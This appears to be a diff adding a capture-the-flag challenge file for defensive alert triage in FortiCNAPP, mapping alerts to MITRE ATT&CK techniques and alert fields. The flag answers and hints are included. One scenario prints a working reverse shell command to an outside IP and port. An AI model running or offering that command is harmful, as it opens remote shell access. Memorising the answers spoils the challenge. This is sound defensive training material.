@@ -1,0 +1,187 @@
+---
+challenges:
+
+- name: "Who's mining our cloud?"
+  value: 100
+  type: standard
+  state: visible
+  description: |
+    ## Scenario
+    Your on-call pager fires at 2 AM. FortiCNAPP raised a **Potentially Compromised Host**
+    alert on 29 hosts — all named `*-watchtower`. The process tree shows `/usr/bin/nc.openbsd`
+    connecting to `xmr-eu1.nanopool.org`, `mine.xmrpool.net`, and `monerohash.com`.
+
+    ## Question
+    According to the **MITRE ATT&CK framework**, what **Technique ID** describes
+    an adversary using victim resources to mine cryptocurrency?
+
+    > Navigate to **FortiCNAPP → Alerts** and open the *Potentially Compromised Host* alert.
+    > Check the **MITRE ATT&CK** tag panel on the right-hand side.
+
+    ## Flag format
+    `FLAG{T####}` — technique ID only, no tactic prefix.
+  flags:
+  - type: static
+    data: case_insensitive
+    content: 'FLAG{T1496}'
+  hints:
+  - content: >
+      The MITRE tactic is "Impact". The technique relates to using compute
+      resources for financial gain without the owner's consent.
+    cost: 10
+  - content: Resource Hijacking — T1496
+    cost: 25
+  tags:
+  - value: forticnapp
+  - value: alert-triage
+  - value: mitre
+  - value: cryptomining
+
+- name: "Assumed Identity"
+  value: 150
+  type: standard
+  state: visible
+  description: |
+    ## Scenario
+    FortiCNAPP raised a **Suspicious Activity AWS User** alert. The investigation
+    surface shows an `AssumedRole` session where a federated user accessed services
+    outside their normal baseline — including `sts:AssumeRole` followed by unusual
+    `s3:GetObject` calls in regions never seen before.
+
+    ## Question
+    What **MITRE ATT&CK Technique ID** describes an adversary obtaining credentials
+    by abusing valid accounts — specifically **cloud accounts** accessed via
+    federated identity / assumed roles?
+
+    > Open the *Suspicious Activity AWS User* alert in FortiCNAPP.
+    > Look for the MITRE technique tagged under the **T1078** family.
+
+    ## Flag format
+    `FLAG{T####.###}` — include the sub-technique number.
+  flags:
+  - type: static
+    data: case_insensitive
+    content: 'FLAG{T1078.004}'
+  hints:
+  - content: T1078 is "Valid Accounts". Look for the cloud-specific sub-technique.
+    cost: 15
+  - content: Cloud Accounts is sub-technique .004 of Valid Accounts.
+    cost: 30
+  tags:
+  - value: forticnapp
+  - value: alert-triage
+  - value: mitre
+  - value: aws
+
+- name: "Red-flagged connection"
+  value: 100
+  type: standard
+  state: visible
+  description: |
+    ## Scenario
+    A **Bad External Client IP Address** alert fired in FortiCNAPP. An EC2 instance
+    established an outbound connection to an IP that appears in **FortiGuard** threat
+    intelligence feeds as **Malicious**.
+
+    The machine is tagged with:
+    - `threat_tags: ["FortiGuard Indicator", "Malicious", "VirusTotal Indicator"]`
+
+    ## Question
+    FortiCNAPP correlates threat intel to surface this alert type. Which FortiCNAPP
+    **alert category** does this alert belong to — as shown in `derivedFields.category`?
+
+    > Open the *Bad External Client IP Address* alert in FortiCNAPP.
+    > Check the alert details panel for the **Category** field.
+
+    ## Flag format
+    `FLAG{Category}` — single word, as it appears in the UI.
+  flags:
+  - type: static
+    data: case_insensitive
+    content: 'FLAG{Policy}'
+  hints:
+  - content: >
+      This is not a Composite or Anomaly alert — it fired because the connection
+      matched a known bad indicator, which maps to a specific category.
+    cost: 10
+  tags:
+  - value: forticnapp
+  - value: alert-triage
+  - value: threat-intel
+
+- name: "Command & Control channel"
+  value: 200
+  type: standard
+  state: visible
+  description: |
+    ## Scenario
+    FortiCNAPP detected a **reverse shell** on a production host. The process tree shows:
+
+    ```
+    bash -i >& /dev/tcp/49.12.80.38/14444 0>&1
+    ```
+
+    A network connection was confirmed outbound to `49.12.80.38:14444`.
+
+    ## Question
+    What **MITRE ATT&CK Technique ID** best describes an adversary using an
+    application-layer protocol to communicate with compromised systems and
+    exfiltrate data — specifically using **non-standard ports** to blend into
+    normal traffic?
+
+    > Hint: The technique family is **Command and Control (TA0011)**.
+
+    ## Flag format
+    `FLAG{T####}` or `FLAG{T####.###}` if a sub-technique applies.
+  flags:
+  - type: static
+    data: case_insensitive
+    content: 'FLAG{T1571}'
+  hints:
+  - content: >
+      The adversary is using a non-standard port (14444) to avoid detection.
+      Look under TA0011 Command and Control.
+    cost: 20
+  - content: Non-Standard Port is T1571.
+    cost: 40
+  tags:
+  - value: forticnapp
+  - value: alert-triage
+  - value: mitre
+  - value: reverse-shell
+
+- name: "Composite threat score"
+  value: 250
+  type: standard
+  state: visible
+  description: |
+    ## Scenario
+    FortiCNAPP raised a **Potentially Compromised AWS Credentials** composite alert.
+    The suspected principal is:
+
+    `AssumedRole/188333028786:ADFS-CIS-RemediationRole`
+
+    Composite alerts in FortiCNAPP combine multiple lower-level signals using ML
+    to calculate a threat score.
+
+    ## Question
+    In FortiCNAPP, what is the **alert type identifier** (the internal `alertType`
+    field) for the *Potentially Compromised AWS Credentials* alert?
+
+    > Open the alert → view the raw JSON details or look at the **Alert Type** field
+    > in the alert header.
+
+    ## Flag format
+    `FLAG{AlertTypeIdentifier}` — CamelCase, no spaces.
+  flags:
+  - type: static
+    data: case_insensitive
+    content: 'FLAG{PotentiallyCompromisedAwsCredentials}'
+  hints:
+  - content: The alert type is the camelCase version of the alert name.
+    cost: 15
+  tags:
+  - value: forticnapp
+  - value: alert-triage
+  - value: aws
+  - value: composite
